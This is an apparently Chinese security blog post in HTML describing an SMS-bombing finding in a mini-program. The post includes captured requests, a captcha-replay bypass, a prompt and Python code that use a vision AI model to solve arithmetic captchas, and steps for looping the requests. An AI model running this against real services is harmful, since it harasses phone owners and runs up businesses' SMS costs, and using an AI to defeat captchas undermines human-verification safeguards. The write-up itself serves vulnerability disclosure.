@@ -1,0 +1,769 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="ss">
+  <meta name="keywords" content="渗透测试, Web安全">
+  
+    <meta name="description" content="短信轰炸是一种业务逻辑安全漏洞，指攻击者利用短信发送接口缺乏频率限制、人机验证或业务上下文校验等缺陷，通过自动化脚本高频触发短信下发，向目标手机号批量发送验证短信，既可对用户造成恶意骚扰与资费损失，也会导致企业短信通道费用激增、服务资源耗尽及合规风险 发现过程在一个小程序中，存在登陆时需要绑定手机号的功能，初看为很常见的若依二改  尝试测试验证码功能，通过burp抓包数据 1234GET &#x2F;xxx">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次有趣的短信轰炸">
+<meta property="og:url" content="https://oxshadow.github.io/2026/03/03/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9C%89%E8%B6%A3%E7%9A%84%E7%9F%AD%E4%BF%A1%E8%BD%B0%E7%82%B8/index.html">
+<meta property="og:site_name" content="OxShadow">
+<meta property="og:description" content="短信轰炸是一种业务逻辑安全漏洞，指攻击者利用短信发送接口缺乏频率限制、人机验证或业务上下文校验等缺陷，通过自动化脚本高频触发短信下发，向目标手机号批量发送验证短信，既可对用户造成恶意骚扰与资费损失，也会导致企业短信通道费用激增、服务资源耗尽及合规风险 发现过程在一个小程序中，存在登陆时需要绑定手机号的功能，初看为很常见的若依二改  尝试测试验证码功能，通过burp抓包数据 1234GET &#x2F;xxx">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://oxshadow.github.io/images/image-20260302234056801.png">
+<meta property="og:image" content="https://oxshadow.github.io/images/image-20260303093404779.png">
+<meta property="og:image" content="https://oxshadow.github.io/images/image-20260303002503912.png">
+<meta property="og:image" content="https://oxshadow.github.io/images/image-20260303085429485.png">
+<meta property="og:image" content="https://oxshadow.github.io/images/image-20260303012253976.png">
+<meta property="og:image" content="https://oxshadow.github.io/images/image-20260303092202301.png">
+<meta property="article:published_time" content="2026-03-03T01:44:12.672Z">
+<meta property="article:modified_time" content="2026-03-03T01:48:23.087Z">
+<meta property="article:author" content="ss">
+<meta property="article:tag" content="AI">
+<meta property="article:tag" content="实战利用">
+<meta property="article:tag" content="防重放">
+<meta property="article:tag" content="短信轰炸">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://oxshadow.github.io/images/image-20260302234056801.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>记一次有趣的短信轰炸 - OxShadow</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"oxshadow.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>ss</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="记一次有趣的短信轰炸"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-03-03 09:44" pubdate>
+          2026年3月3日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          25 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">记一次有趣的短信轰炸</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>短信轰炸是一种业务逻辑安全漏洞，指攻击者利用短信发送接口缺乏频率限制、人机验证或业务上下文校验等缺陷，通过自动化脚本高频触发短信下发，向目标手机号批量发送验证短信，既可对用户造成恶意骚扰与资费损失，也会导致企业短信通道费用激增、服务资源耗尽及合规风险</p>
+<h3 id="发现过程"><a href="#发现过程" class="headerlink" title="发现过程"></a>发现过程</h3><p>在一个小程序中，存在登陆时需要绑定手机号的功能，初看为很常见的若依二改</p>
+<p><img src="/images/image-20260302234056801.png" srcset="/img/loading.gif" lazyload alt="image-20260302234056801"></p>
+<p>尝试测试验证码功能，通过burp抓包数据</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/xxxx/getVerificationCode?pNumber=13411111111&amp;code=54&amp;uuid=0b976797d06a46abb251e0f935266e3a</span> <span class="hljs-meta">HTTP/2</span><br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=1, i<br></code></pre></td></tr></table></figure>
+
+<p>重发包发现会显示验证码失效</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;msg&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;验证码已失效&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;code&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">500</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="绕过防重放"><a href="#绕过防重放" class="headerlink" title="绕过防重放"></a>绕过防重放</h3><p>分析数据包，发现参数为pNumber,code,uuid。尝试删除uuid和code</p>
+<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">&#123;<span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-type"></span>&quot;Required request parameter <span class="hljs-string">&#x27;code&#x27;</span> <span class="hljs-keyword">for</span> method parameter type <span class="hljs-keyword">String</span> <span class="hljs-keyword">is</span> not present<span class="hljs-string">&quot;,&quot;</span>code<span class="hljs-string">&quot;:500&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>发现不能成功，尝试爆破code从1-100也仍然失败。回显仍然是验证码失效</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;msg&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;验证码已失效&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;code&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">500</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>跟进代码查看。网址利用默认浏览器打开，F12定位接口，在该位置打下断点</p>
+<p><img src="/images/image-20260303093404779.png" srcset="/img/loading.gif" lazyload alt="image-20260303093404779"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">n.getVerificationCode = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) </span>&#123;<br>     <span class="hljs-keyword">return</span> t.http.<span class="hljs-title function_ invoke__">request</span>(&#123;<br>     <span class="hljs-attr">url</span>: <span class="hljs-string">&quot;/xxxx/getVerificationCode&quot;</span>,<br>     <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;GET&quot;</span>,<br>   <span class="hljs-attr">data</span>: e<br>  &#125;)<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里可以看出e就是参数内容,寻找uuid生成方式(code很明显是后端生成的图形验证码运算后的结果)，全局搜索uuid</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs less"> <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.getcaptchaImage</span>)(&#123;&#125;)<span class="hljs-selector-class">.then</span>((<span class="hljs-built_in">function</span>(i) &#123;<br>    var n = i.data;<br>    e.captchaImg = <span class="hljs-string">&quot;data:image/gif;base64,&quot;</span> + n.img,<br>    e.loginFormData.uuid = n.uuid,<br>    t &amp;&amp; uni.$u.<span class="hljs-built_in">toast</span>(<span class="hljs-string">&quot;图形验证码错误，请重新输入&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>发现uuid与img一致，都由后端生成而来。且是由getcaptchaImage接口生成。抓包访问接口验证</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/captchaImage</span> <span class="hljs-meta">HTTP/2</span><br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=1, i<br></code></pre></td></tr></table></figure>
+
+<p>返回包中包括了图片验证码的base64+uuid</p>
+<p><img src="/images/image-20260303002503912.png" srcset="/img/loading.gif" lazyload alt="image-20260303002503912"></p>
+<p>那么只需要从这个接口获取这两样数据，再加入到第一个数据包中即可以绕过验证码重放限制。</p>
+<h3 id="识别图片验证码"><a href="#识别图片验证码" class="headerlink" title="识别图片验证码"></a>识别图片验证码</h3><p>如果利用之前的ocr的话还是很难识别出来的。ocr会把常见的+号识别为t，而*和&#x2F;一般会被忽略掉识别，需要不断地调试很麻烦。那么则可以直接利用AI模型。将img的base64值先还原成图片，在将图片发送给AI识别，给AI附上提示词。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">图片中是一个个位数的数学表达式，格式如：3+<span class="hljs-attribute">4</span>=? 或 5<span class="hljs-number">*2</span>=?<br>请只识别前三个字符：第一个数字、运算符、第二个数字。<br>- 数字范围：0-9，运算符：+ - * /<br>- 输出格式：只输出3个字符，如 3+4 或 5<span class="hljs-number">*2</span><br>- 不要输出等号、问号、结果或任何解释<br></code></pre></td></tr></table></figure>
+
+<p>AI即可精准识别前三位，再配合脚本运算即可得到code。脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">recognize_captcha</span>(<span class="hljs-params">img_b64</span>):<br>    <span class="hljs-keyword">try</span>:<br>        response = client.chat.completions.create(<br>            model=<span class="hljs-string">&quot;xxxx&quot;</span>,<br>            messages=[<br>                &#123;<br>                    <span class="hljs-string">&quot;role&quot;</span>: <span class="hljs-string">&quot;user&quot;</span>,<br>                    <span class="hljs-string">&quot;content&quot;</span>: [<br>                        &#123;<br>                            <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;text&quot;</span>,<br>                            <span class="hljs-string">&quot;text&quot;</span>: <span class="hljs-string">&quot;&quot;&quot;图片中是一个个位数的数学表达式，格式如：3+4=? 或 5*2=?</span><br><span class="hljs-string">请只识别前三个字符：第一个数字、运算符、第二个数字。</span><br><span class="hljs-string">- 数字范围：0-9，运算符：+ - * /</span><br><span class="hljs-string">- 输出格式：只输出3个字符，如 3+4 或 5*2</span><br><span class="hljs-string">- 不要输出等号、问号、结果或任何解释&quot;&quot;&quot;</span><br>                        &#125;,<br>                        &#123;<br>                            <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;image_url&quot;</span>,<br>                            <span class="hljs-string">&quot;image_url&quot;</span>: &#123;<span class="hljs-string">&quot;url&quot;</span>: <span class="hljs-string">f&quot;image/png;base64,<span class="hljs-subst">&#123;img_b64&#125;</span>&quot;</span>&#125;,<br>                        &#125;,<br>                    ],<br>                &#125;<br>            ],<br>            max_tokens=<span class="hljs-number">10</span>,<br>            temperature=<span class="hljs-number">0</span>,<br>        )<br><br>        ai_output = response.choices[<span class="hljs-number">0</span>].message.content.strip()<br><br>        cleaned = re.search(<span class="hljs-string">r&#x27;(\d[\+\-\*\/]\d)&#x27;</span>, ai_output)<br>        expr = cleaned.group(<span class="hljs-number">1</span>) <span class="hljs-keyword">if</span> cleaned <span class="hljs-keyword">else</span> ai_output[:<span class="hljs-number">3</span>]<br><br>        result, expr_str = calculate_simple(expr)<br>        <span class="hljs-keyword">if</span> result <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&#x27;expression&#x27;</span>: expr_str, <span class="hljs-string">&#x27;result&#x27;</span>: result, <span class="hljs-string">&#x27;raw&#x27;</span>: ai_output&#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20260303085429485.png" srcset="/img/loading.gif" lazyload alt="image-20260303085429485"></p>
+<p>那么流程就很清晰了。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.发包接口/captchaImage触发uuid和图片的<span class="hljs-built_in">base64</span>值生成<br>2.取出img的<span class="hljs-built_in">base64</span>值先转化为图片发送给AI<br>3.AI识别图片前三位，记录并发送给下一步运算<br>4.脚本将前三位数据带入运算得到code<br>5.将code和uuid放入到/xxxx/getVerificationCode接口中发送<br>6.循环发包实现重放<br></code></pre></td></tr></table></figure>
+
+<p>这里三四也可以合并让AI一起操作。将思路告诉AI生成代码即可，以下为执行示例图</p>
+<p><img src="/images/image-20260303012253976.png" srcset="/img/loading.gif" lazyload alt="image-20260303012253976"></p>
+<p>成功率基本是接近100%的，这里我加入了一秒休眠，正常五秒内发一次没问题。</p>
+<h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p>成功绕过防重放，可以低量爆破(这里有点取决于AI识别的速度)，成功造成短信轰炸</p>
+<p><img src="/images/image-20260303092202301.png" srcset="/img/loading.gif" lazyload alt="image-20260303092202301"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/AI/" class="print-no-link">#AI</a>
+      
+        <a href="/tags/%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/" class="print-no-link">#实战利用</a>
+      
+        <a href="/tags/%E9%98%B2%E9%87%8D%E6%94%BE/" class="print-no-link">#防重放</a>
+      
+        <a href="/tags/%E7%9F%AD%E4%BF%A1%E8%BD%B0%E7%82%B8/" class="print-no-link">#短信轰炸</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>记一次有趣的短信轰炸</div>
+      <div>https://oxshadow.github.io/2026/03/03/记一次有趣的短信轰炸/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>ss</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年3月3日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2026年3月3日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/02/24/%E8%AE%B0%E4%B8%80%E6%AC%A1sign%E9%80%86%E5%90%91%E8%BF%87%E7%A8%8B/" title="记一次sign逆向过程">
+                        <span class="hidden-mobile">记一次sign逆向过程</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'OxShadow/OxShadow.github.io');
+      s.setAttribute('issue-term', 'pathname');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
